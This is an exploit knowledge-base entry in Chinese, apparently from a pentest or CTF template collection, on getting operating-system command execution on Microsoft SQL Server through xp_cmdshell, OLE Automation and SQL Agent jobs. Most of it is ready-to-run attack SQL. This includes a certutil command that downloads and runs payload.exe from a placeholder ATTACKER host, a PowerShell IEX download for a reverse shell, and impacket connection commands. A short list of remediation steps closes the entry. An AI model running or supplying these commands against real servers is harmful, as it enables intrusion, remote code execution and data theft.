---
id: MSSQL-XPCMDSHELL-RCE
title: "MSSQL - xp_cmdshell/OLE Automation/Agent Job 命令执行"
product: mssql
vendor: Microsoft
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, xp_cmdshell, ole, agent-job, 需要认证]
fingerprint: ["Microsoft SQL Server"]
---

## 漏洞描述

Microsoft SQL Server 提供了多种可被利用执行操作系统命令的内置功能。`xp_cmdshell` 是最直接的方式，默认关闭但 sysadmin 权限用户（如 sa）可以开启。当 xp_cmdshell 被禁用或删除时，还可以通过 OLE Automation Procedures（sp_OACreate）或 SQL Server Agent Job 作为替代方案实现命令执行。

## 影响版本

- 所有版本（需要 sysadmin 权限）

## 前置条件

- 已获取 sysadmin 权限的数据库账号（如 sa）
- 对应功能未被安全策略完全阻断

## 利用步骤

### 方法一：xp_cmdshell（最直接）

```sql
-- 开启 xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 执行命令
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig /all';
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';

-- 下载并执行
EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\payload.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\payload.exe';

-- PowerShell 反弹 shell
EXEC xp_cmdshell 'powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/rev.ps1'')"';
```

### 方法二：OLE Automation（xp_cmdshell 不可用时）

```sql
-- 开启 OLE Automation Procedures
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\Windows\Temp\out.txt';
```

### 方法三：SQL Agent Job（需要 SQL Agent 服务运行）

```sql
USE msdb;
EXEC sp_add_job @job_name='pwn';
EXEC sp_add_jobstep @job_name='pwn', @step_name='exec',
    @subsystem='CmdExec', @command='whoami > C:\Windows\Temp\out.txt';
EXEC sp_add_jobserver @job_name='pwn';
EXEC sp_start_job @job_name='pwn';
-- 等待执行
WAITFOR DELAY '00:00:03';
EXEC xp_cmdshell 'type C:\Windows\Temp\out.txt';
-- 清理
EXEC sp_delete_job @job_name='pwn';
```

## Payload

```bash
# 使用 impacket 连接并执行
impacket-mssqlclient sa:PASSWORD@TARGET
# 或域认证
impacket-mssqlclient DOMAIN/sa:PASSWORD@TARGET -windows-auth
```

## 修复建议

1. 禁用 xp_cmdshell 并限制 sp_configure 权限
2. 禁用 OLE Automation Procedures
3. 不使用 sa 账号进行日常操作，使用最小权限原则
4. 设置强密码，避免使用默认账号
5. 使用防火墙限制 1433 端口访问来源
6. 启用审计日志监控 xp_cmdshell 调用
